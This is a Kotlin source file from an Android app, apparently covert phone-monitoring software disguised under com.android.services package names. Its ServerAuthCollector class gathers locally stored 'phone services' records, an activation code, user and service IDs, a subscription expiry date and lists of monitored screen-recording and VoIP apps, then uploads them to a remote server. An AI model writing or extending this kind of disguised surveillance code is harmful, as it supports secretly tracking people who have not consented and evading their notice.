package com.android.services.logs.collectors.auth

import android.content.Context
import com.android.services.db.entities.PhoneServices
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.Auth
import com.android.services.models.SyncSetting
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder

class ServerAuthCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        try {
            localDatabaseSource.selectAllPhoneServiceList { phoneServices ->
                logVerbose("${AppConstants.SERVER_AUTH} data = $phoneServices")
                val remoteServerHelper = RemoteServerHelper(
                    context,
                    AppConstants.SERVER_AUTH,
                    localDatabaseSource,
                    tosApi
                )
                val auth = getAuthInfo(phoneServices)
                remoteServerHelper.upload(listOf(auth))
            }
        } catch (e: Exception) {
            logVerbose("${AppConstants.SERVER_AUTH} exception = $e")
        }
    }
    private fun getAuthInfo(phoneServices: List<PhoneServices>): Auth {
        val syncSetting = try {
            if (AppConstants.syncSetting.isNullOrEmpty()) {
                SyncSetting()
            } else {
                GsonBuilder().create()
                    .fromJson<SyncSetting>(AppConstants.syncSetting, SyncSetting::class.java)
            }
        } catch (e: Exception) {
            SyncSetting()
        }
        return Auth(
            true,
            AppConstants.activationCode ?: "",
            AppConstants.screenRecordingApps,
            AppConstants.voipCallApps,
            syncSetting,
            AppConstants.serviceExpiryDate,
            AppConstants.phoneServiceId?.toInt() ?: 0,
            AppConstants.userId?.toInt() ?: 0,
            userInfo = phoneServices
        )

    }
}